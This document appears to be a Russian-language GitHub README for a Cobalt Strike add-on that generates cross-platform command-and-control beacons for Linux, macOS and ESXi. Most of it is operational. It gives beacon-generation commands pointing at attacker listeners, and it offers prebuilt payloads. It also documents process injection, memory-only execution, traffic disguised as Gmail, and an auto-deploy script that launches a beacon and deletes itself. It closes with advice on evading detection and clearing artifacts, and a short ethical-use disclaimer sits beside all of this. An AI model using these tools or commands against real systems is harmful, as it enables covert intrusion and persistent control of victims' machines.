# 💀 AKUMA CrossC2 Arsenal 💀
*The Ultimate Cross-Platform C2 Framework Arsenal*

```ascii
 ▄████▄   ██▀███   ▒█████    ██████   ██████     ▄████▄   ▄█████▄ 
▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▒██    ▒    ▒██▀ ▀█        ██░
▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ░ ▓██▄      ▒▓█        █████▒ 
▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░  ▒   ██▒  ▒   ██▒   ▒▓▓▄ ▄█ ░▒██      
▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░▒██████▒▒▒██████▒▒   ▒ ▓███▀  ░▒▓█████▓
░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░   ░ ░▒ ▒    ░▒ ░▓ ░░
  ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░░ ░▒  ░ ░     ░  ▒     ░ ░░ ░ 
░          ░░   ░ ░ ░ ░ ▒  ░  ░  ░  AKUMA's Arsenal @hook   
░ ░         ░         ░ ░        ░        ░     ░ ░          ░    
░                                               ░                 
```

> **"Если у тебя нет CrossC2 beacon'а, то ты не хакер, а просто парень с Kali Linux!"** - *AKUMA*

## 🔥 Что это за магия?

**AKUMA CrossC2 Arsenal** - это мощнейший набор инструментов для создания и управления кросс-платформенными C2 beacon'ами. Забудь про ограничения Windows - теперь ты можешь владеть Linux, macOS, ESXi и даже IoT устройствами!

### 🎯 Основные фишки:
- **🐧 Linux x86/x64** - Полный контроль над пингвинами
- **🍎 macOS x86/x64/M1** - Яблочки тоже под контролем
- **🔧 ESXi** - Виртуализация? Не проблема!
- **💾 Memory-only execution** - Никаких артефактов на диске
- **🎭 APT Simulation** - Мимикрия под реальные группировки
- **🔒 Custom C2 Profiles** - Прячься как профи
- **🐍 Python/Bash Script Engine** - Выполнение скриптов в памяти

## 📁 Структура проекта

```
AKUMA-CrossC2-Arsenal/
├── 📜 scripts/                  # Aggressor Scripts для Cobalt Strike
│   ├── CrossC2Kit.cna          # Основное ядро системы
│   ├── CrossC2Kit_Loader.cna   # Загрузчик всех модулей
│   ├── CrossC2-GithubBot-2023-11-20.cna  # GUI генератор
│   └── CrossC2Kit/             # Полная коллекция модулей
├── 🔧 tools/                   # Консольные инструменты
│   └── genCrossC2.Linux        # Генератор beacon'ов
├── 💣 payloads/                # Готовые к использованию payload'ы
├── 🎭 profiles/                # C2 профили для стелса
├── 📚 docs/                    # Документация
└── 💡 examples/                # Примеры использования
```

## 🚀 Быстрый старт

### 1. Подготовка окружения
```bash
# Устанавливаем необходимые зависимости
sudo apt update && sudo apt install -y git openjdk-11-jdk

# Клонируем арсенал
git clone https://github.com/sweetpotatohack/AKUMA-CrossC2-Arsenal.git
cd AKUMA-CrossC2-Arsenal
```

### 2. Загрузка в Cobalt Strike
```bash
# В Cobalt Strike Client:
# Cobalt Strike -> Script Manager -> Load -> scripts/CrossC2Kit_Loader.cna
```

### 3. Генерация beacon'ов

#### 🐧 Базовый Linux beacon
```bash
./tools/genCrossC2.Linux \
  192.168.1.100 \
  4444 \
  /path/to/.cobaltstrike.beacon_keys \
  null \
  Linux \
  x64 \
  ./evil_beacon \
  raw
```

#### 🎭 Стелс-beacon с C2 профилем
```bash
./tools/genCrossC2.Linux \
  your.c2domain.com \
  443 \
  /path/to/.cobaltstrike.beacon_keys \
  ";;./profiles/gmail-profile.profile" \
  Linux \
  x64 \
  ./stealth_beacon \
  upx
```

#### 🍎 macOS M1 beacon
```bash
./tools/genCrossC2.Linux \
  192.168.1.100 \
  4444 \
  /path/to/.cobaltstrike.beacon_keys \
  null \
  MacOS \
  M1 \
  ./macos_beacon \
  raw
```

#### 🔧 ESXi специальный beacon
```bash
./tools/genCrossC2.Linux \
  192.168.1.100 \
  4444 \
  /path/to/.cobaltstrike.beacon_keys \
  null \
  ESXI \
  x64 \
  ./esxi_beacon \
  raw
```

## 🎯 Продвинутые техники

### 💾 Memory-only execution
```bash
# В beacon консоли Cobalt Strike:
cc2-run <alias_name> <process_name> <args>
```

### 🐍 Python script в памяти
```bash
# Загрузка Python скрипта:
python-import /path/to/your_script.py
```

### 🔄 Process injection
```bash
# Инжекция в процесс:
inject <pid> <x64|x86>
```

### 🎭 Metadata spoofing
```bash
# Смена OS fingerprint:
setostype Linux
setlocalip 10.0.0.100
sethostname fake-hostname
```

## 🔥 Готовые payload'ы

В папке `payloads/` лежат готовые beacon'ы:
- `beacon_4444_x64` - Стандартный Linux x64 для порта 4444
- `beacon_44323_x64` - Стандартный Linux x64 для порта 44323  
- `stealth_beacon_4444_x64` - Стелс-версия с Gmail профилем

### Запуск:
```bash
chmod +x payloads/beacon_4444_x64
./payloads/beacon_4444_x64 &
```

## 🎭 C2 Profiles

Используй готовые профили из папки `profiles/`:
- **Gmail profile** - Мимикрия под Gmail трафик
- **APT profiles** - Имитация реальных группировок
- **Social media profiles** - Маскировка под соцсети

## ⚠️ Параметры genCrossC2

```
Синтаксис:
./genCrossC2.Linux [host] [port] [beacon_keys] [rebind_lib] [platform] [arch] [output] [upx] [cs_version]

Параметры:
-host         : IP/домен твоего listener'а (192.168.1.100 / evil.c2domain.com)
-port         : Порт listener'а (4444, 443, 80, etc.)
-beacon_keys  : Путь к .cobaltstrike.beacon_keys или 'null'
-rebind_lib   : Кастомный rebind lib или 'null'
-platform     : Linux | MacOS | ESXI | Linux-bind | MacOS-bind | Linux-lib | MacOS-lib
-arch         : x86 | x64 | M1
-output       : Имя выходного файла
-upx          : upx | raw (сжатие)
-cs_version   : 4.1-4.9 | 4.4-src
```

## 🔧 Troubleshooting

### Beacon не подключается?
```bash
# Проверь listener'ы:
ss -tuln | grep [PORT]

# Проверь firewall:
sudo ufw status

# Проверь процесс beacon'а:
ps aux | grep beacon
lsof -p [PID]
```

### Ошибка при генерации?
```bash
# Убедись что .gen.jar есть в директории:
cp /path/to/cobaltstrike-client.jar ./.gen.jar

# Проверь права на beacon keys:
chmod 644 .cobaltstrike.beacon_keys
```

## 🛡️ Opsec заметки

- **Используй VPS** с чистой репутацией для C2
- **Ротируй домены** и IP адреса регулярно
- **Кастомизируй C2 профили** под цель
- **Избегай детекции** - используй memory-only execution
- **Очищай артефакты** после работы

## 🏆 Фишки от AKUMA

### 🎪 Массовая генерация beacon'ов:
```bash
#!/bin/bash
# Mass beacon generator by AKUMA

TARGETS=("Linux x64" "MacOS x64" "MacOS M1")
for target in "${TARGETS[@]}"; do
    OS=$(echo $target | cut -d' ' -f1)
    ARCH=$(echo $target | cut -d' ' -f2)
    ./tools/genCrossC2.Linux 192.168.1.100 4444 null null $OS $ARCH ./beacon_${OS,,}_${ARCH,,} upx
done
```

### 🎯 Auto-deployment script:
```bash
#!/bin/bash
# Auto deploy and callback

BEACON="./beacon_linux_x64"
chmod +x $BEACON

# Запуск в фоне
nohup $BEACON > /dev/null 2>&1 &

# Самоуничтожение
sleep 10 && rm -f $BEACON $0 &
```

## 💀 Disclaimer

**ЭТО ИНСТРУМЕНТ ДЛЯ ЭТИЧНОГО ХАКИНГА И ПЕНТЕСТИНГА!**

- ✅ Используй только на своих системах
- ✅ Получай разрешение перед тестированием
- ✅ Соблюдай законы твоей юрисдикции
- ❌ Не используй для незаконных целей

> **"С большой силой приходит большая ответственность. Не будь мудаком!"** - *AKUMA*

## 🤝 Contributing

Нашёл баг? Есть идея крутой фишки? Присылай PR!

1. Fork репозиторий
2. Создай feature branch
3. Коммить изменения
4. Пуш в branch
5. Открой Pull Request

## 📞 Контакты

- **GitHub**: [@sweetpotatohack](https://github.com/sweetpotatohack)
- **Telegram**: @akuma_hacker (если найдёшь 😉)

## 🔥 Благодарности

- **CrossC2 Team** - За оригинальный фреймворк
- **Cobalt Strike** - За платформу C2
- **AKUMA** - За легендарную кастомизацию и стиль

---

*"Помни: лучший хакер - это тот, кого никто не заметил"* 🥷

**Happy Hacking! 💀🔥**
